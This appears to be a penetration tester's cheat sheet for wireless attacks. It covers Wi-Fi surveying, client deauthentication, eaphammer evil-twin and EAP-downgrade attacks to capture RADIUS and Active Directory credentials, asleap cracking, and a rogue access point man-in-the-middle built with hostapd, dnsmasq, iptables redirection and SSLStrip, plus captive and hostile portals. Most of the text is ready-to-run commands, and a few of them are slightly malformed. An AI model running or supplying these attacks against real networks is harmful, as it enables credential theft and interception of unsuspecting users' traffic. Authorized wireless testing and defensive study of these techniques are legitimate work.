Identify Scope

We need to identify which APs are in-scope for the assessment. This starts with performing a (mostly) passive Wi-Fi survey. Bust out an Alpha card, put it in monitor mode, and start dumping packets.


ip netns add wireless
iw phy phy0 set netns name wireless
ip netns exec wireless ifconfig wlan0 down
ip netns exec wireless iwconfig wlan0 essid "JPH-Guest"
ip netns exec wireless ifconfig wlan0 up
ip netns exec wireless dhclient wlan0
ip netns exec wireless <path to browser executable>

```
airmon-ng start wlan0
```

```
airodump-ng -w survey0 wlan0mon
```

Look for APs that look like they are in-scope based on name and maybe even manufacturer of the APs if you can see one in the building. If there are lots of BSSIDs without associated ESSIDs, then you can deauth a few clients from the cloaked BSSIDs to decloak them:

```
aireplay-ng -b 34:FC:B9:4D:4E:E0 -c 11  wlan0mon
```
airodump-ng -w capture1 —output-format pcap —bssid 34:FC:B9:4D:4E:E0 —channel 11 wlan0mon

aireplay-ng -0 10 -a  34:FC:B9:4D:4E:E0 -c 04:0E:3C:7E:C1:75 wlan0mon

You can cross reference the ESSIDs you identify with ones at another branch/location, if applicable, to increase confidence in your scope selection. Do this by either performing the survey at another site yourself or using Wigle, or both.

Attacking And Gaining Entry To WPA2-EAP Wireless Networks

Rogue access point attacks are the bread and butter of modern wireless penetration tests. They can be used to perform stealthy man-in-the-middle attacks, steal RADIUS credentials, and trick users into interacting with malicious captive portals. Penetration testers can even use them for traditional functions such as deriving WEP keys and capturing WPA handshakes. Best of all, they are often most effective when used out of range of the target network

An Evil Twin is a wireless attack that works by impersonating a legitimate access point. The 802.11 protocol allows clients to roam freely from access point to access point. Additionally, most wireless implementations do not require mutual authentication between the access point and the wireless client. This means that wireless clients must rely exclusively on the following attributes to identify access points:

BSSID – The access point’s Basic Service Set identifier, which refers to the access point and every client that is associated with it. Usually, the access point’s MAC address is used to derive the BSSID.
ESSID – The access point’s Extended Service Set identifier, known colloquially as the AP’s “network name.” An Extended Service Set (ESS) is a collection of Basic Service Sets connected using a common Distribution System (DS).
Channel – The operating channel of the access point.

To execute the attack, the attacker creates an access point using the same ESSID and channel as a legitimate AP on the target network. So long as the malicious access point has a more powerful signal strength than the legitimate AP, all devices connected to the target AP will drop and connect to the attacker.

We’ll begin by creating a self-signed certificate using eaphammer’s --cert-wizard flag:

```
./eaphammer --cert-wizard
```

The Cert Wizard routine will walk you through the creation of a self-signed x.509 certificate, prompting you to enter values for a series of attributes. It’s best to choose attributes for your self-signed certificate that are believable within the context of your target organization. Since we’re attacking Evil Corp, the following examples values would be good choices:

Country – US
State – Utah
Locale – Salt Lake City
Organization – Evil Corp
Email – admin@evilcorp.com
CN – admin@evilcorp.com

Once we have created a believable certificate, we can proceed to launch an Evil Twin attack against one of the target access points discovered in the last section. Let’s use eaphammer to perform an Evil Twin attack against the access point with BSSID 1c:7e:e5:97:79:b1:

```
./eaphammer --bssid 1c:7e:e5:97:79:b1 --essid ECwnet1 --channel 2 --wpa 2 --auth wpa-eap --interface wlan0 --creds
```

Provided you can provide a better signal than the target access point, clients will begin to disconnect from the target network and connect to your AP instead. Unless the affected client devices configured to reject invalid certificates, the victims of the attack will be presented with a message similar to the one below:

Fortunately, it’s usually possible to find at least one enterprise employee who will blindly accept your certificate. It’s also common to encounter devices that are configured to accept invalid certificates automatically (especially when the target organization allows BYOD devices). In either case, you’ll soon see usernames, challenges, and responses shown in your terminal as shown below

This data can be passed to asleap to obtain a valid set of RADIUS credentials.

```
asleap –C <challenge> -R <response> -W <wordlist>
```

EAP DOwngrade attack to prompt windows devices for cleartext creds:

```
./eaphammer -i wlan0 -e exampleWiFi --auth wpa-eap --creds --eap-downgrade full
```

MitM Attacks:

Kill processes that could mess things up:

```
service network-manager stop
rfkill unblock wlan
ifconfig wlan0 up
```

hostapd settup:

```
interface=wlan0
driver=nl80211
ssid=FREE_WIFI
channel=1
hw_mode=g
```

```
hostapd ./hostapd.conf
```

```
ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
```

dnsmasq setup:

```
# define DHCP pool
dhcp-range=10.0.0.80,10.0.0.254,6h
# set Google as nameserver
dhcp-option=6,8.8.8.8
# set rogue AP as Gateway
dhcp-option=3,10.0.0.1 #Gateway
dhcp-authoritative
log-queries
```

```
dnsmasq -z -p 0 -C ./dnsmasq.conf -i "$phy" -I lo
```

```
iptables --policy INPUT ACCEPT
iptables --policy FORWARD ACCEPT
iptables --policy OUTPUT ACCEPT
iptables --flush
iptables --table nat --flush
```

```
iptables --table nat --append POSTROUTING -o $upstream --jump MASQUERADE
```


```
iptables --append FORWARD -i $phy -o $upstream --jump ACCEPT
```

```
iptables --table nat --append PREROUTING --protocol tcp --destination-port 80 --jump REDIRECT --to-port 10000
```

We then add the following call to SSLStrip, using the -p flag to log only

```
python -l 10000 -p -w ./sslstrip.log
```

Captive Portal Attacks:

Create a captive portal using eaphammer with the following flags:

```
bssid=`ifconfig eth0 | grep ether | awk '{ print $2 }'`
```
```
./eaphammer -i wlan0 --bssid $bssid --essid FREE_WIFI --captive-portal
```



Hostile Portal Attack to Get AD Creds:
```
./eaphammer --interface wlan0 \
    --bssid 1C:7E:E5:97:79:B1 \
    --essid EvilC0rp \
    --channel 6 \
    --auth wpa-eap \
    --hostile-portal

./eaphammer --interface wlan0 \
    --essid TotallyLegit \
    --hw-mode n \
    --channel 36 \
    --auth open \
    --hostile-portal
```

For 802.1n networks (most modern) make sure to select a hardware mode:
```
./eaphammer -i wlan0 -c 161 --essid MyNetwork --creds --hw-mode n
```


To create an 802.11n access point with a channel width of 40MHz, we just use the –channel-width flag as shown in the following command:

```
./eaphammer -i wlan0 -c 1 --essid MyNetwork --creds --hw-mode n --channel-width 40
```

This will cause EAPHammer to create a 40MHz channel and automatically select a valid secondary channel based on the specified primary channel.
